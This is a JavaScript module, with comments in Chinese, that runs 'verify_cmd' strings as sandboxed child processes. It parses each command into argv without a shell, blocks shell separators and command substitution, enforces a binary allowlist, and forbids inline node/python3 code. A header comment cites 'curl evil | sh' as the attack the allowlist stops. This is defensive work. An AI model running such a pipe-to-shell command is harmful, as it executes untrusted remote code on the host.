/**
 * swarm-exec — 沙箱化 verify_cmd 执行器。
 *
 * 设计要点（高安全 + 高稳定）：
 * - 不经过 shell：`sh -c` 会把 queue 里的一行变成任意 RCE。这里解析成 argv 后
 *   直接 spawn，禁掉 `; | && $() > < \`` 等拼接符。
 * - 首 token 必须在允许清单内（可配置追加），杜绝 `curl evil | sh`。
 * - 异步 spawn：不阻塞事件循环（旧实现用 execFileSync，会卡住所有 session 30s+）。
 * - 硬超时 + SIGKILL + 输出截断（默认 64KB）：长跑/刷屏的 verify 不会拖垮进程。
 * - 结果结构化，供 gate + verdict 消费。
 */
import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';
import { join, delimiter } from 'node:path';

// 只拦「一旦被下游 shell 重新解析就致命」的字符。
// 注意：我们直接 spawn（不经 shell），所以括号/大括号本身无害；
// 真正危险的是分隔符与命令替换，以及可能被 npm/pnpm 脚本再次交给 shell 的管道/串接。
const SHELL_METACHARS = /[;&|`\n\r]/;
const COMMAND_SUBST = /\$\(/;

export const DEFAULT_ALLOWLIST = [
  'node', 'npm', 'pnpm', 'yarn', 'bun', 'bunx',
  'npx', 'go', 'cargo', 'python3', 'pytest', 'uv',
  'git', 'make', 'mvn', 'gradle', './gradlew',
];

/** 在 PATH 里找裸命令（best-effort，找不到回 null，永不抛错）。 */
function findOnPath(name) {
  try {
    const clean = String(name ?? '').trim();
    if (!clean || clean.includes('/')) return null;
    const pathEnv = process.env.PATH ?? '';
    for (const d of pathEnv.split(delimiter)) {
      if (!d) continue;
      const cand = join(d, clean);
      try {
        if (existsSync(cand)) return cand;
      } catch {
        // 单个候选不可读就跳过
      }
    }
    return null;
  } catch {
    return null;
  }
}

/** node/python3 禁止内联代码（-e/-c）；可执行代码请改用脚本文件传参。 */
const INLINE_CODE_BINS = new Set(['node', 'python3']);

/**
 * 改写外部文件/配置类 flag（warn-only，不拦，给 R2 留收敛插槽）：
 * make -f/--file（指向外部 Makefile）、git -c/--config（改写配置）、npm --prefix/--config。
 */
const REWRITE_WARN_RULES = [
  { bins: new Set(['make']), hit: (t) => t === '-f' || t.startsWith('-f') || t.startsWith('--file') || t.startsWith('--makefile'), flag: '-f/--file' },
  { bins: new Set(['git']), hit: (t) => t === '-c' || t.startsWith('-c') || t.startsWith('--config'), flag: '-c/--config' },
  { bins: new Set(['npm']), hit: (t) => t === '-f' || t.startsWith('--prefix') || t.startsWith('--config'), flag: '--prefix/--config/-f' },
];

/** 把命令串解析为 argv（支持简单引号），并做安全校验。 */
export function parseCommand(cmd, allowlist = DEFAULT_ALLOWLIST) {
  const text = String(cmd ?? '').trim();
  if (!text) return { ok: false, reason: 'empty verify_cmd' };
  if (SHELL_METACHARS.test(text) || COMMAND_SUBST.test(text)) {
    return { ok: false, reason: `verify_cmd contains shell separator/substitution; not allowed: ${text}` };
  }
  const argv = [];
  let buf = '';
  let quote = null;
  for (const ch of text) {
    if (quote) {
      if (ch === quote) quote = null;
      else buf += ch;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    if (/\s/.test(ch)) {
      if (buf) { argv.push(buf); buf = ''; }
      continue;
    }
    buf += ch;
  }
  if (quote) return { ok: false, reason: 'unbalanced quote in verify_cmd' };
  if (buf) argv.push(buf);
  if (!argv.length) return { ok: false, reason: 'empty argv' };
  const bin = argv[0];
  // ① 只认裸名（spawn 经 PATH 解析）或白名单精确命中；含 / 的一律拒收。
  // 白名单不动：'./gradlew' 这类显式条目走精确命中，照旧放行。
  if (!allowlist.includes(bin)) {
    if (bin.includes('/')) {
      const base = bin.split('/').pop();
      const found = findOnPath(base);
      return {
        ok: false,
        reason: `verify_cmd 必须是 PATH 可解析的裸命令名，不接受含 / 的路径：${bin}` +
          (found ? `（PATH 中 ${base} 位于 ${found}，请直接写「${[base, ...argv.slice(1)].join(' ')}」）` : `（请改用裸命令名，如 ${base}）`),
      };
    }
    return { ok: false, reason: `command not in allowlist: ${bin}` };
  }
  // ② node/python3 禁止 -e/-c 内联代码（白名单精确命中的带路径条目也按 basename 归一）。
  const base = bin.includes('/') ? bin.split('/').pop() : bin;
  if (INLINE_CODE_BINS.has(base)) {
    const bad = argv.slice(1).find((t) => t === '-e' || t === '-c');
    if (bad) {
      return { ok: false, reason: `${base} 禁止 ${bad} 内联代码：可执行代码请改用脚本文件传参（如 ${base} ./scripts/verify.mjs）` };
    }
  }
  // ③ make/git/npm 改写类 flag：只做 warn 证据，不拦。
  const warnings = [];
  for (const rule of REWRITE_WARN_RULES) {
    if (!rule.bins.has(base)) continue;
    for (const t of argv.slice(1)) {
      let hit = false;
      try {
        hit = rule.hit(t);
      } catch {
        hit = false;
      }
      if (hit) {
        warnings.push(`warn-only：${bin} ${rule.flag} 可能改写外部文件/配置（本次放行，收敛留给 R2）：${t}`);
        break;
      }
    }
  }
  return { ok: true, argv, warnings };
}

/**
 * 执行 verify_cmd。永不抛错，返回结构化结果。
 * @returns {Promise<{ok:boolean, code:number|null, timedOut:boolean, stdout:string, stderr:string, durationMs:number, reason?:string}>}
 */
export function runVerify(cmd, opts = {}) {
  const { cwd, timeoutMs = 300_000, maxOutputBytes = 64 * 1024, allowlist = DEFAULT_ALLOWLIST, env } = opts;
  const parsed = parseCommand(cmd, allowlist);
  if (!parsed.ok) {
    return Promise.resolve({
      ok: false, code: null, timedOut: false, stdout: '', stderr: '',
      durationMs: 0, reason: parsed.reason, warnings: [],
    });
  }
  const execWarnings = Array.isArray(parsed.warnings) ? parsed.warnings : [];
  const started = Date.now();
  return new Promise((resolvePromise) => {
    let stdout = '';
    let stderr = '';
    let truncated = false;
    let timedOut = false;
    let settled = false;

    const child = spawn(parsed.argv[0], parsed.argv.slice(1), {
      cwd,
      env: { ...process.env, ...(env ?? {}) },
      stdio: ['ignore', 'pipe', 'pipe'],
      detached: process.platform !== 'win32',
    });

    const cap = (chunk, into) => {
      if (into.length >= maxOutputBytes) { truncated = true; return into; }
      const next = into + chunk.toString('utf8');
      if (next.length > maxOutputBytes) { truncated = true; return next.slice(0, maxOutputBytes); }
      return next;
    };

    child.stdout.on('data', (c) => { stdout = cap(c, stdout); });
    child.stderr.on('data', (c) => { stderr = cap(c, stderr); });

    const killTree = () => {
      try {
        if (process.platform !== 'win32') process.kill(-child.pid, 'SIGKILL');
        else child.kill('SIGKILL');
      } catch { /* already gone */ }
    };

    const timer = setTimeout(() => {
      timedOut = true;
      killTree();
    }, timeoutMs);

    const done = (code, spawnErr) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      const durationMs = Date.now() - started;
      const ok = !spawnErr && !timedOut && code === 0;
      const reason = spawnErr
        ? `spawn failed: ${spawnErr.message}`
        : timedOut
          ? `verify_cmd timed out after ${timeoutMs}ms`
          : code === 0 ? 'ok' : `verify_cmd exited ${code}`;
      resolvePromise({
        ok, code, timedOut,
        stdout: truncated ? stdout + '\n…[truncated]' : stdout,
        stderr: truncated ? stderr + '\n…[truncated]' : stderr,
        durationMs, reason, warnings: execWarnings,
      });
    };

    child.on('error', (err) => done(null, err));
    child.on('close', (code) => done(code ?? null, null));
  });
}
